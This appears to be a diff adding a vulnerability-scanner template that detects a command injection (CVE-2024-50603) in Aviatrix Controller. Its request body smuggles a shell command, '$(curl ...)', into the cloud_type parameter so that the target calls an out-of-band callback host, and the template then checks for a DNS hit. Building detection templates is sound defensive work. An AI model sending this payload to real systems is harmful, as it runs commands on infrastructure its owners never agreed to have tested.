@@ -1,0 +1,31 @@
+id: aviatrix-controller-command-injection
+info:
+  name: Aviatrix Controller Command Injection Vulnerability (CVE-2024-50603)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection,cve,dnslog
+  description: |
+    This template detects a command injection vulnerability in Aviatrix Controller by leveraging DNS-based out-of-band interaction.
+
+variables:
+  dns_domain: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - /v1/api
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+{{dns_domain}})
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "list_flightpath_destination_instances"
